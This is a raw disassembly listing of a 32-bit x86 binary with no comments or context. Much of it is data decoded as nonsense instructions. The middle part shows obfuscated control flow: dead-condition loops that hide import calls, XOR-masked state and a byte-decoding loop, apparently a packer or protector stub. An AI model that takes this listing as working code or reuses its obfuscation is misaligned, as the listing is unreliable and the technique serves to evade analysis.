  40c771:	loopne 0x40c740
  40c773:	(bad)  
  40c775:	cmp    dh,BYTE PTR [esi-0x78]
  40c778:	dec    edx
  40c779:	lahf   
  40c77a:	in     eax,dx
  40c77b:	mov    ebp,0x26dfd0cf
  40c780:	mov    al,ds:0x93eefae5
  40c785:	addr16 jp 0x40c715
  40c788:	(bad)  
  40c789:	jg     0x40c7a8
  40c78b:	fwait
  40c78c:	int3   
  40c78d:	lods   al,BYTE PTR ds:[esi]
  40c78e:	jno    0x40c7d4
  40c790:	dec    edx
  40c791:	fsub   st(6),st
  40c793:	jo     0x40c73e
  40c795:	(bad)  
  40c796:	mov    fs,WORD PTR [ebx]
  40c798:	xor    dl,ah
  40c79a:	jbe    0x40c80d
  40c79c:	ja     0x40c72c
  40c79e:	xchg   esp,eax
  40c79f:	ja     0x40c80c
  40c7a1:	ja     0x40c7bc
  40c7a3:	mov    fs,WORD PTR [eax-0x1f]
  40c7a6:	in     al,0xcb
  40c7a8:	aas    
  40c7a9:	jmp    0x40c74c
  40c7ab:	inc    eax
  40c7ac:	es mov ah,0xa9
  40c7af:	pop    ss
  40c7b0:	mov    DWORD PTR [ebx],ebp
  40c7b2:	xchg   DWORD PTR [bp+si+0x48a4],ebx
  40c7b7:	or     bl,cl
  40c7b9:	xor    eax,0x32f226f3
  40c7be:	and    edi,ebp
  40c7c0:	dec    esi
  40c7c1:	int    0xbe
  40c7c3:	jb     0x40c7d5
  40c7c5:	adc    eax,0xc6664f5b
  40c7ca:	repz or al,0x96
  40c7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7ce:	popa   
  40c7cf:	fcomp  QWORD PTR [ecx]
  40c7d1:	pop    esp
  40c7d2:	scas   eax,DWORD PTR es:[edi]
  40c7d3:	das    
  40c7d4:	lds    ecx,FWORD PTR [eax]
  40c7d6:	test   BYTE PTR [ecx+0x6d],dl
  40c7d9:	out    0x8d,eax
  40c7db:	enter  0x37f4,0xd9
  40c7df:	pop    ss
  40c7e0:	add    eax,0x523ba48d
  40c7e5:	inc    esi
  40c7e6:	jecxz  0x40c7a5
  40c7e8:	shl    DWORD PTR [esi+edi*4],1
  40c7eb:	xchg   edx,eax
  40c7ec:	stos   BYTE PTR es:[edi],al
  40c7ed:	xor    DWORD PTR [ecx-0x5e],ebx
  40c7f0:	cwde   
  40c7f1:	jo     0x40c7d9
  40c7f3:	sahf   
  40c7f4:	xchg   ebp,eax
  40c7f5:	push   esi
  40c7f6:	sbb    dl,BYTE PTR [eax+edx*1+0x5b]
  40c7fa:	xchg   edx,eax
  40c7fb:	mov    cl,0x26
  40c7fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7fe:	sbb    ecx,DWORD PTR [ebp+0x64]
  40c801:	or     DWORD PTR ds:0xfa843a99,0xe17070da
  40c80b:	aam    0xcf
  40c80d:	jge    0x40c815
  40c80f:	and    al,0x7f
  40c811:	adc    al,0x1
  40c813:	shl    DWORD PTR [esi],0xb1
  40c816:	repnz xchg esi,eax
  40c818:	xchg   esp,eax
  40c819:	pop    esi
  40c81a:	xchg   BYTE PTR [ecx-0xa],cl
  40c81d:	loopne 0x40c886
  40c81f:	outs   dx,BYTE PTR ds:[esi]
  40c820:	pop    edi
  40c821:	cli    
  40c822:	mov    dh,dl
  40c824:	push   ss
  40c825:	jle    0x40c855
  40c827:	xor    edx,DWORD PTR [edi+0x6f]
  40c82a:	dec    ecx
  40c82b:	xchg   ebx,eax
  40c82c:	ja     0x40c83c
  40c82e:	jne    0x40c81b
  40c830:	mov    ds:0x6d7b72e7,eax
  40c835:	imul   ebx,DWORD PTR [edi],0x9b3ed017
  40c83b:	loop   0x40c821
  40c83d:	push   eax
  40c83e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c83f:	dec    ebp
  40c840:	ffreep st(3)
  40c842:	cmc    
  40c843:	pop    eax
  40c844:	scas   eax,DWORD PTR es:[edi]
  40c845:	xchg   edi,eax
  40c846:	dec    esi
  40c847:	out    0x53,al
  40c849:	fwait
  40c84a:	pop    eax
  40c84b:	mov    ebx,0x39b9250f
  40c850:	adc    DWORD PTR [esi*8-0x3b86ce67],ecx
  40c857:	jecxz  0x40c8aa
  40c859:	in     al,0x7
  40c85b:	test   DWORD PTR [edi+0x2b],0xec347afc
  40c862:	scas   eax,DWORD PTR es:[edi]
  40c863:	daa    
  40c864:	es jl  0x40c83a
  40c867:	mov    al,ds:0x92a50761
  40c86c:	ins    BYTE PTR es:[edi],dx
  40c86d:	fs mov cl,0x6e
  40c870:	pop    ebx
  40c871:	add    ah,bh
  40c873:	cs jmp 0x5bf5:0x6398e328
  40c87b:	jns    0x40c8e6
  40c87d:	sub    eax,0xf1f5388c
  40c882:	leave  
  40c883:	cs iret 
  40c885:	scas   al,BYTE PTR es:[edi]
  40c886:	sub    BYTE PTR [esi+0x4cf2983b],cl
  40c88c:	cvtps2pd xmm2,QWORD PTR [esi-0x55]
  40c890:	cmc    
  40c891:	fs cld 
  40c893:	int3   
  40c894:	inc    ebx
  40c895:	repz mov ecx,0xcbcef5c4
  40c89b:	cwde   
  40c89c:	or     DWORD PTR [ebx],edi
  40c89e:	jl     0x40c8a1
  40c8a0:	inc    ebp
  40c8a1:	mov    WORD PTR [edx+0x453f9cb2],gs
  40c8a7:	xor    eax,0xa4fbbd73
  40c8ac:	loop   0x40c8a5
  40c8ae:	cmp    al,0xf4
  40c8b0:	mov    al,ds:0x4d4697fc
  40c8b5:	cs (bad) 
  40c8b7:	jbe    0x40c868
  40c8b9:	les    esp,FWORD PTR [edx-0x583907f8]
  40c8bf:	jl     0x40c924
  40c8c1:	sub    ebx,esi
  40c8c3:	cdq    
  40c8c4:	jo     0x40c8db
  40c8c6:	es clc 
  40c8c8:	cmp    al,0x55
  40c8ca:	push   es
  40c8cb:	push   esi
  40c8cc:	mov    bl,cl
  40c8ce:	cmp    eax,0x431667f5
  40c8d3:	and    eax,0x550ab24c
  40c8d8:	cli    
  40c8d9:	xor    dh,BYTE PTR [ecx-0x4e]
  40c8dc:	mov    dl,0x6b
  40c8de:	scas   eax,DWORD PTR es:[edi]
  40c8df:	hlt    
  40c8e0:	vpsubw ymm6,ymm7,YMMWORD PTR [edx-0x39bf5196]
  40c8e8:	and    BYTE PTR [edi-0x3c2f7452],bh
  40c8ee:	jcxz   0x40c88b
  40c8f1:	mov    edi,DWORD PTR [edi+0x4b73d39e]
  40c8f7:	or     al,0xf4
  40c8f9:	bnd jno 0x40c8f0
  40c8fc:	clc    
  40c8fd:	adc    al,0x6b
  40c8ff:	xchg   edx,eax
  40c900:	sub    bh,BYTE PTR [esi+0x527f316f]
  40c906:	js     0x40c8e4
  40c908:	scas   al,BYTE PTR es:[edi]
  40c909:	fisubr DWORD PTR [edx]
  40c90b:	ja     0x40c942
  40c90d:	je     0x40c954
  40c90f:	loopne 0x40c984
  40c911:	mov    ?,ebp
  40c913:	neg    esi
  40c915:	lahf   
  40c916:	fwait
  40c917:	adc    BYTE PTR [esi],dl
  40c919:	xchg   BYTE PTR [esi+0x15],al
  40c91c:	xor    al,0xe2
  40c91e:	xor    DWORD PTR es:[esi+ebx*2+0x3d],0x8691f2ad
  40c927:	loope  0x40c93c
  40c929:	pop    es
  40c92a:	nop
  40c92b:	dec    edi
  40c92c:	or     al,bh
  40c92e:	leave  
  40c92f:	in     al,dx
  40c930:	and    ebx,DWORD PTR [ecx]
  40c932:	daa    
  40c933:	aam    0x79
  40c935:	mov    ebx,0xe510c95
  40c93a:	push   ecx
  40c93b:	jg     0x40c994
  40c93d:	push   es
  40c93e:	cs adc al,0x9e
  40c941:	outs   dx,BYTE PTR ds:[esi]
  40c942:	push   esi
  40c943:	into   
  40c944:	or     BYTE PTR [ecx],dl
  40c946:	imul   esp,DWORD PTR [esi+eax*4+0x19cc61df],0xa2c41f6a
  40c951:	mov    DWORD PTR [esi-0x3f3cd438],edi
  40c957:	test   BYTE PTR [ebp+0x2d8cb51c],cl
  40c95d:	lea    edx,[edi]
  40c95f:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40c966:	xor    DWORD PTR ds:0x413d34,0x2984
  40c970:	mov    ecx,DWORD PTR [ebp-0x14]
  40c973:	and    DWORD PTR ds:0x413d24,0x0
  40c97d:	jmp    0x40c990
  40c982:	xor    eax,eax
  40c984:	or     eax,DWORD PTR ds:0x413d24
  40c98a:	inc    eax
  40c98b:	mov    ds:0x413d24,eax
  40c990:	cmp    DWORD PTR ds:0x413d24,0x18
  40c997:	jae    0x40ca0e
  40c99d:	cmp    DWORD PTR ds:0x413d24,0x20
  40c9a4:	jne    0x40c9bd
  40c9aa:	push   0x738d
  40c9af:	push   0x6edb
  40c9b4:	push   DWORD PTR [ebp-0x18]
  40c9b7:	call   DWORD PTR ds:0x416768
  40c9bd:	jmp    0x40c982
  40c9c2:	mov    DWORD PTR ds:0x413c1e,0x1e
  40c9cc:	cmp    DWORD PTR ds:0x413c1e,0x0
  40c9d3:	je     0x40ca0e
  40c9d9:	cmp    DWORD PTR ds:0x413c1e,0x2c
  40c9e0:	jne    0x40c9fe
  40c9e6:	push   0x25a0
  40c9eb:	push   0x413ce4
  40c9f0:	push   0x3cd5
  40c9f5:	push   DWORD PTR [ebp-0x18]
  40c9f8:	call   DWORD PTR ds:0x416770
  40c9fe:	mov    eax,ds:0x413c1e
  40ca03:	dec    eax
  40ca04:	mov    ds:0x413c1e,eax
  40ca09:	jmp    0x40c9cc
  40ca0e:	push   esi
  40ca0f:	sbb    DWORD PTR ds:0x413ce4,0x7973
  40ca19:	mov    eax,0x7510894
  40ca1e:	and    DWORD PTR ds:0x413c1e,0x0
  40ca28:	jmp    0x40ca3a
  40ca2d:	mov    esi,DWORD PTR ds:0x413c1e
  40ca33:	inc    esi
  40ca34:	mov    DWORD PTR ds:0x413c1e,esi
  40ca3a:	cmp    DWORD PTR ds:0x413c1e,0x15
  40ca41:	jae    0x40ca74
  40ca47:	cmp    DWORD PTR ds:0x413c1e,0x1f
  40ca4e:	jne    0x40ca6e
  40ca54:	push   0x413c12
  40ca59:	push   0x88a1
  40ca5e:	push   0x416000
  40ca63:	push   0x416152
  40ca68:	call   DWORD PTR ds:0x416774
  40ca6e:	jmp    0x40ca2d
  40ca73:	inc    esi
  40ca74:	xor    ecx,eax
  40ca76:	sub    esi,DWORD PTR ds:0x413c70
  40ca7c:	mov    esi,0x3272dc
  40ca81:	mov    DWORD PTR ds:0x413c80,0x12bb
  40ca8b:	push   edi
  40ca8c:	xor    DWORD PTR ds:0x413ce4,0x413c6c
  40ca96:	add    ecx,esi
  40ca98:	jmp    0x40cab4
  40ca9d:	mov    dl,BYTE PTR [ebp-0x1]
  40caa0:	not    DWORD PTR ds:0x41400c
  40caa6:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40caad:	not    DWORD PTR ds:0x413ce8
  40cab3:	inc    ecx
  40cab4:	cmp    ecx,0x40
  40cab7:	mov    DWORD PTR ds:0x413d24,0x3f58
  40cac1:	jb     0x40ca9d
  40cac7:	adc    edx,0x503d
  40cacd:	mov    edx,DWORD PTR [ebp-0x14]
  40cad0:	xor    edx,eax
  40cad2:	add    edx,esi
  40cad4:	jmp    0x40cc01
  40cad9:	and    DWORD PTR ds:0x413c0a,0x1a66
  40cae3:	mov    edi,DWORD PTR [ebp+0x8]
  40cae6:	and    ecx,0xcf4
  40caec:	mov    ecx,0x8a87
  40caf1:	adc    DWORD PTR ds:0x413c12,0x413d
  40cafb:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40cb00:	and    DWORD PTR ds:0x41401c,0x0
  40cb0a:	mov    edi,DWORD PTR ds:0x41401c
  40cb10:	inc    edi
  40cb11:	mov    DWORD PTR ds:0x41401c,edi
  40cb17:	cmp    DWORD PTR ds:0x41401c,0x5
  40cb1e:	jne    0x40cb39
  40cb24:	push   0x6acf
  40cb29:	push   0x413cf4
  40cb2e:	push   0x416152
  40cb33:	call   DWORD PTR ds:0x416778
  40cb39:	cmp    DWORD PTR ds:0x41401c,0x4
  40cb40:	jne    0x40cb53
  40cb46:	mov    edi,DWORD PTR ds:0x41401c
  40cb4c:	inc    edi
  40cb4d:	mov    DWORD PTR ds:0x41401c,edi
  40cb53:	cmp    DWORD PTR ds:0x41401c,0x1b
  40cb5a:	jb     0x40cb0a
  40cb60:	mov    DWORD PTR ds:0x414018,0x15
  40cb6a:	cmp    DWORD PTR ds:0x414018,0x0
  40cb71:	je     0x40cbab
  40cb77:	cmp    DWORD PTR ds:0x414018,0x1b
  40cb7e:	jne    0x40cb8f
  40cb84:	push   0x4160b3
  40cb89:	call   DWORD PTR ds:0x41677c
  40cb8f:	mov    edi,DWORD PTR ds:0x414018
  40cb95:	dec    edi
  40cb96:	mov    DWORD PTR ds:0x414018,edi
  40cb9c:	jmp    0x40cb6a
  40cba1:	xor    DWORD PTR ds:0x414008,0x3196
  40cbab:	mov    edi,0x3b4a
  40cbb0:	add    cx,di
  40cbb3:	sbb    DWORD PTR ds:0x414000,0x24d3
  40cbbd:	movzx  ecx,cx
  40cbc0:	xor    DWORD PTR ds:0x413bfe,0x413c06
  40cbca:	mov    DWORD PTR [ebp-0x10],ecx
  40cbcd:	neg    DWORD PTR ds:0x413c0e
  40cbd3:	mov    ecx,DWORD PTR [ebp+0x8]
  40cbd6:	or     DWORD PTR ds:0x413d20,0x3470
  40cbe0:	movzx  ecx,WORD PTR [ecx+edx*4]
  40cbe4:	xor    DWORD PTR ds:0x413d30,0x413bf6
  40cbee:	xor    ecx,0x8a87
  40cbf4:	add    ecx,edi
  40cbf6:	mov    edi,DWORD PTR [ebp-0x10]
  40cbf9:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40cc00:	inc    edx
  40cc01:	mov    ecx,DWORD PTR [ebp-0x18]
  40cc04:	cmp    edx,ecx
  40cc06:	mov    DWORD PTR ds:0x414010,0x5811
  40cc10:	jne    0x40cad9
  40cc16:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc19:	mov    DWORD PTR ds:0x413d1c,0x410a
  40cc23:	mov    edx,DWORD PTR [ebp+0x10]
  40cc26:	dec    DWORD PTR ds:0x413cec
  40cc2c:	xor    ecx,eax
  40cc2e:	add    ecx,esi
  40cc30:	and    DWORD PTR ds:0x413c0a,0x5ecf
  40cc3a:	mov    DWORD PTR [edx],ecx
  40cc3c:	dec    ecx
  40cc3d:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc40:	xor    ecx,eax
  40cc42:	and    DWORD PTR ds:0x413bf6,0x413c84
  40cc4c:	add    ecx,esi
  40cc4e:	mov    DWORD PTR ds:0x413c0a,0x45cc
  40cc58:	mov    DWORD PTR [ebp-0x20],ecx
  40cc5b:	not    ecx
  40cc5d:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  40cc64:	mov    DWORD PTR [ebp-0xc],0xf89c85a0
  40cc6b:	mov    DWORD PTR [ebp-0x1c],0xf89c95b0
  40cc72:	mov    DWORD PTR ds:0x413c6c,edi
  40cc78:	mov    ecx,DWORD PTR [ebp-0xc]
  40cc7b:	mov    DWORD PTR ds:0x413c84,0x129c
  40cc85:	mov    DWORD PTR [ebp+0x8],ecx
  40cc88:	jmp    0x40ce75
  40cc8d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc90:	add    edx,DWORD PTR ds:0x413c80
  40cc96:	mov    edx,DWORD PTR [ebp-0x8]
  40cc99:	and    DWORD PTR ds:0x413c74,0x413d20
  40cca3:	xor    ecx,eax
  40cca5:	xor    edx,eax
  40cca7:	sub    ecx,edx
  40cca9:	sub    ecx,esi
  40ccab:	xor    ecx,eax
  40ccad:	and    DWORD PTR ds:0x413c1a,0x0
  40ccb7:	mov    edx,DWORD PTR ds:0x413c1a
  40ccbd:	inc    edx
  40ccbe:	mov    DWORD PTR ds:0x413c1a,edx
  40ccc4:	cmp    DWORD PTR ds:0x413c1a,0x9
  40cccb:	jne    0x40cce4
  40ccd1:	push   0x413bfe
  40ccd6:	push   DWORD PTR [ebp-0x20]
  40ccd9:	push   0x4160ed
  40ccde:	call   DWORD PTR ds:0x416780
  40cce4:	cmp    DWORD PTR ds:0x413c1a,0x8
  40cceb:	jne    0x40ccfe
  40ccf1:	mov    edx,DWORD PTR ds:0x413c1a
  40ccf7:	inc    edx
  40ccf8:	mov    DWORD PTR ds:0x413c1a,edx
  40ccfe:	cmp    DWORD PTR ds:0x413c1a,0x10
  40cd05:	jb     0x40ccb7
  40cd0b:	mov    DWORD PTR [ebp+0x8],ecx
  40cd0e:	adc    ecx,ecx
  40cd10:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd13:	mov    DWORD PTR ds:0x413c16,0x3405
  40cd1d:	mov    edx,DWORD PTR [ebp-0x64]
  40cd20:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd27:	mov    DWORD PTR [ebp-0x64],ecx
  40cd2a:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd2d:	mov    edx,DWORD PTR [ebp-0x60]
  40cd30:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd37:	movzx  edx,WORD PTR ds:0x413d20
  40cd3e:	sbb    edx,DWORD PTR ds:0x413d28
  40cd44:	mov    DWORD PTR ds:0x413d20,edx
  40cd4a:	mov    DWORD PTR [ebp-0x60],ecx
  40cd4d:	and    DWORD PTR ds:0x414000,0x413d1c
  40cd57:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd5a:	add    DWORD PTR ds:0x413c78,ebx
  40cd60:	mov    edx,DWORD PTR [ebp-0x5c]
  40cd63:	neg    DWORD PTR ds:0x413c02
  40cd69:	lea    ecx,[edx+ecx*1+0x5708f2]
  40cd70:	and    DWORD PTR ds:0x413d20,0x0
  40cd7a:	mov    edx,DWORD PTR ds:0x413d20
  40cd80:	inc    edx
  40cd81:	mov    DWORD PTR ds:0x413d20,edx
  40cd87:	cmp    DWORD PTR ds:0x413d20,0xa
  40cd8e:	jne    0x40cda2
  40cd94:	push   0x413d34
  40cd99:	push   DWORD PTR [ebp-0x24]
  40cd9c:	call   DWORD PTR ds:0x416784
  40cda2:	cmp    DWORD PTR ds:0x413d20,0x9
  40cda9:	jne    0x40cdbe
  40cdaf:	xor    edx,edx
  40cdb1:	add    edx,DWORD PTR ds:0x413d20
  40cdb7:	inc    edx
  40cdb8:	mov    DWORD PTR ds:0x413d20,edx
  40cdbe:	cmp    DWORD PTR ds:0x413d20,0x15
  40cdc5:	jb     0x40cd7a
  40cdcb:	or     DWORD PTR ds:0x413ce8,0x2ce1
  40cdd5:	mov    DWORD PTR [ebp-0x5c],ecx
  40cdd8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cddb:	add    DWORD PTR ds:0x413c1e,ecx
  40cde1:	mov    edx,DWORD PTR [ebp-0x58]
  40cde4:	lea    ecx,[edx+ecx*1+0x5708f3]
  40cdeb:	add    DWORD PTR ds:0x413bfe,ebx
  40cdf1:	mov    DWORD PTR [ebp-0x58],ecx
  40cdf4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cdf7:	or     DWORD PTR ds:0x413c80,0x1524
  40ce01:	mov    edx,DWORD PTR [ebp-0x54]
  40ce04:	lea    ecx,[edx+ecx*1+0x5708fc]
  40ce0b:	adc    edx,DWORD PTR ds:0x41400c
  40ce11:	mov    DWORD PTR [ebp-0x54],ecx
  40ce14:	and    DWORD PTR ds:0x413d20,0x0
  40ce1e:	mov    edx,DWORD PTR ds:0x413d20
  40ce24:	inc    edx
  40ce25:	mov    DWORD PTR ds:0x413d20,edx
  40ce2b:	cmp    DWORD PTR ds:0x413d20,0x12
  40ce32:	jne    0x40ce48
  40ce38:	push   0x8060
  40ce3d:	push   0x41608d
  40ce42:	call   DWORD PTR ds:0x41678c
  40ce48:	cmp    DWORD PTR ds:0x413d20,0x10
  40ce4f:	jb     0x40ce1e
  40ce55:	mov    ecx,DWORD PTR [ebp+0x8]
  40ce58:	sbb    edx,DWORD PTR ds:0x413c0e
  40ce5e:	mov    edx,DWORD PTR [ebp-0x50]
  40ce61:	sbb    DWORD PTR ds:0x413cf4,0x413c16
  40ce6b:	lea    ecx,[edx+ecx*1+0x5708fd]
  40ce72:	mov    DWORD PTR [ebp-0x50],ecx
  40ce75:	and    DWORD PTR ds:0x413c12,0x0
  40ce7f:	mov    ecx,DWORD PTR ds:0x413c12
  40ce85:	inc    ecx
  40ce86:	mov    DWORD PTR ds:0x413c12,ecx
  40ce8c:	cmp    DWORD PTR ds:0x413c12,0x1d
  40ce93:	jne    0x40ceb7
  40ce99:	push   DWORD PTR [ebp-0x20]
  40ce9c:	push   0x413c70
  40cea1:	push   0x4dec
  40cea6:	push   0x4160bf
  40ceab:	push   DWORD PTR [ebp-0x20]
  40ceae:	push   DWORD PTR [ebp-0x10]
  40ceb1:	call   DWORD PTR ds:0x416790
  40ceb7:	cmp    DWORD PTR ds:0x413c12,0x11
  40cebe:	jb     0x40ce7f
  40cec4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cec7:	xor    ecx,eax
  40cec9:	add    ecx,esi
  40cecb:	jne    0x40cc8d
  40ced1:	jmp    0x40f43d
  40ced6:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ced9:	mov    edx,DWORD PTR [ebp-0x8]
  40cedc:	xor    ecx,eax
  40cede:	xor    edx,eax
  40cee0:	sub    ecx,edx
  40cee2:	sub    ecx,esi
  40cee4:	xor    ecx,eax
  40cee6:	mov    DWORD PTR [ebp-0x1c],ecx
  40cee9:	mov    ecx,DWORD PTR [ebp-0xc]
  40ceec:	mov    DWORD PTR [ebp+0x8],ecx
  40ceef:	jmp    0x40cf21
  40cef4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cef7:	mov    edx,DWORD PTR [ebp-0x8]
  40cefa:	xor    ecx,eax
  40cefc:	xor    edx,eax
  40cefe:	sub    ecx,edx
  40cf00:	sub    ecx,esi
  40cf02:	xor    ecx,eax
  40cf04:	mov    DWORD PTR [ebp+0x8],ecx
  40cf07:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf0a:	mov    edx,DWORD PTR [ebp+0x8]
  40cf0d:	imul   edx,edx,0x5708f1
  40cf13:	xor    ecx,eax
  40cf15:	add    ecx,esi
  40cf17:	lea    ecx,[ebp+ecx*4-0x64]
  40cf1b:	mov    edi,DWORD PTR [ecx]
  40cf1d:	add    edx,edi
  40cf1f:	mov    DWORD PTR [ecx],edx
  40cf21:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf24:	xor    ecx,eax
  40cf26:	add    ecx,esi
  40cf28:	jne    0x40cef4
  40cf2e:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf31:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf38:	mov    dl,BYTE PTR [ebp-0x1]
  40cf3b:	cmp    cl,dl
  40cf3d:	je     0x40f39e
  40cf43:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf46:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf4d:	mov    edx,DWORD PTR [ebp+0xc]
  40cf50:	cmp    cl,BYTE PTR [edx]
  40cf52:	jne    0x40f44f
  40cf58:	mov    ecx,DWORD PTR [ebp-0x14]
  40cf5b:	mov    edx,DWORD PTR [ebp+0xc]
  40cf5e:	movsx  edx,BYTE PTR [edx]
  40cf61:	xor    ecx,eax
  40cf63:	add    ecx,esi
  40cf65:	cmp    edx,ecx
  40cf67:	mov    ecx,DWORD PTR [ebp-0xc]
  40cf6a:	mov    DWORD PTR [ebp+0x8],ecx
  40cf6d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf70:	je     0x411851
  40cf76:	jmp    0x40cfab
  40cf7b:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf7e:	mov    edx,DWORD PTR [ebp-0x8]
  40cf81:	xor    ecx,eax
  40cf83:	xor    edx,eax
  40cf85:	sub    ecx,edx
  40cf87:	sub    ecx,esi
  40cf89:	xor    ecx,eax
  40cf8b:	mov    DWORD PTR [ebp+0x8],ecx
  40cf8e:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf91:	mov    edx,DWORD PTR [ebp+0x8]
  40cf94:	xor    ecx,eax
  40cf96:	imul   edx,edx,0x5708f1
  40cf9c:	add    ecx,esi
  40cf9e:	lea    ecx,[ebp+ecx*4-0x64]
  40cfa2:	mov    edi,DWORD PTR [ecx]
  40cfa4:	add    edx,edi
  40cfa6:	mov    DWORD PTR [ecx],edx
  40cfa8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cfab:	xor    ecx,eax
  40cfad:	add    ecx,esi
  40cfaf:	jne    0x40cf7b
  40cfb5:	mov    ecx,DWORD PTR [ebp-0x14]
  40cfb8:	mov    edx,DWORD PTR [ebp+0x8]
  40cfbb:	xor    ecx,eax
  40cfbd:	xor    edx,eax
  40cfbf:	add    ecx,esi
  40cfc1:	add    edx,esi
  40cfc3:	cmp    ecx,edx
  40cfc5:	jae    0x40f3e3
  40cfcb:	lea    edx,[ecx-0x3272dc]
  40cfd1:	mov    DWORD PTR [ebp-0x18],edx
  40cfd4:	mov    edi,DWORD PTR [ebp-0x18]
  40cfd7:	mov    DWORD PTR [ebp-0x24],0x705fd0e
  40cfde:	lea    edx,[ebp-0x24]
  40cfe1:	mov    DWORD PTR [ebp-0x10],edx
  40cfe4:	mov    edx,DWORD PTR [ebp-0x10]
  40cfe7:	add    DWORD PTR [edx],0x705fa0e
  40cfed:	mov    ebx,DWORD PTR [ebp-0x10]
  40cff0:	xor    edi,eax
  40cff2:	add    edi,DWORD PTR [ebx]
  40cff4:	lea    edx,[ebp+ecx*4-0x64]
  40cff8:	jmp    0x40f380
  40cffd:	sar    BYTE PTR [ebx-0x74043cf0],1
  40d003:	jae    0x40cfc0
  40d005:	dec    ebp
  40d006:	bound  esi,QWORD PTR [eax-0x129abfa3]
  40d00c:	dec    esi
  40d00d:	mov    dl,0xe9
  40d00f:	jl     0x40d08d
  40d011:	pop    es
  40d012:	pop    edi
  40d013:	jl     0x40d091
  40d015:	ror    BYTE PTR [eax],cl
  40d017:	push   edx
  40d018:	jle    0x40cffa
  40d01a:	xor    BYTE PTR [eax],ch
  40d01c:	xchg   esp,eax
  40d01d:	mul    DWORD PTR [edi-0x4d]
  40d020:	imul   eax,DWORD PTR [edi+edx*1+0x2f945fb],0xe
  40d028:	pop    edi
  40d029:	ret    0x7872
  40d02c:	stos   BYTE PTR es:[edi],al
  40d02d:	mov    esi,0x22cebb70
  40d032:	inc    esi
  40d033:	mov    ebx,0xa786db85
  40d038:	mov    eax,0x3e7f3028
  40d03d:	fwait
  40d03e:	sub    ebx,DWORD PTR [edi-0x54]
  40d041:	xchg   esp,eax
  40d042:	gs fwait
  40d044:	sbb    DWORD PTR [ebp+0x2],eax
  40d047:	test   DWORD PTR [edx],0x53bf11b
  40d04d:	sar    BYTE PTR [eax+eiz*4+0x69],cl
  40d051:	je     0x40d048
  40d053:	clc    
  40d054:	xor    dl,BYTE PTR [ebp+0x44]
  40d057:	fistp  QWORD PTR [edx-0x26]
  40d05a:	ins    DWORD PTR es:[edi],dx
  40d05b:	leave  
  40d05c:	fstp   TBYTE PTR [eax]
  40d05e:	xchg   ebx,eax
  40d05f:	mov    dl,BYTE PTR [ebx+edx*2]
  40d062:	sub    al,0x2a
  40d064:	jne    0x40d029
  40d066:	inc    esi
  40d067:	rcr    BYTE PTR [edi],cl
  40d069:	(bad)  
  40d06a:	stos   DWORD PTR es:[edi],eax
  40d06b:	ds push esi
  40d06d:	nop    DWORD PTR [ebx+eiz*2]
  40d071:	in     al,dx
  40d072:	push   0x3d70e768
  40d077:	dec    edi
  40d078:	xor    BYTE PTR [esi-0x5f],bh
  40d07b:	and    al,0x80
  40d07d:	test   DWORD PTR ss:[esi],0xb1741519
  40d084:	inc    esp
  40d085:	sub    ch,BYTE PTR [edx-0x79]
  40d088:	xlat   BYTE PTR ds:[ebx]
  40d089:	inc    edi
  40d08a:	pop    es
  40d08b:	push   eax
  40d08c:	add    eax,0x482bdf36
  40d091:	icebp  
  40d092:	pushf  
  40d093:	aad    0x78
  40d095:	es jne 0x40d084
  40d098:	add    edx,edx
  40d09a:	pop    ss
  40d09b:	test   eax,0x1574463f
  40d0a0:	or     dh,bh
  40d0a2:	sbb    esp,ebx
  40d0a4:	mov    esp,0x119afee2
  40d0a9:	xchg   DWORD PTR [ebp+0xf],esp
  40d0ac:	jge    0x40d101
  40d0ae:	int3   
  40d0af:	and    al,0xa3
  40d0b1:	sar    BYTE PTR [edx],1
  40d0b3:	and    ah,ah
  40d0b5:	adc    al,0xe4
  40d0b7:	sub    ah,BYTE PTR [edx]
  40d0b9:	(bad)  
  40d0ba:	pop    esp
  40d0bb:	xor    edi,DWORD PTR [ebx]
  40d0bd:	xor    ebp,DWORD PTR [edi]
  40d0bf:	das    
  40d0c0:	pop    esp
  40d0c1:	in     eax,dx
  40d0c2:	xchg   ebp,ebp
  40d0c4:	inc    edi
  40d0c5:	xchg   ch,al
  40d0c7:	and    bl,BYTE PTR [ecx+0xf43e307]
  40d0cd:	call   0x4f90b6b6
  40d0d2:	test   DWORD PTR [eax],ebx
  40d0d4:	icebp  
  40d0d5:	test   BYTE PTR cs:[esi],al
  40d0d8:	jb     0x40d14b
  40d0da:	loop   0x40d0bf
  40d0dc:	cmp    edi,DWORD PTR [eax]
  40d0de:	stc    
  40d0df:	jbe    0x40d0fb
  40d0e1:	jb     0x40d0bc
  40d0e3:	cmp    eax,0x3f75fa66
  40d0e8:	dec    ebx
  40d0e9:	ret    0xd530
  40d0ec:	mov    eax,0xf5d47d45
  40d0f1:	xor    BYTE PTR ds:0x583e6bd4,bh
  40d0f7:	les    esp,FWORD PTR [eax+0x5]
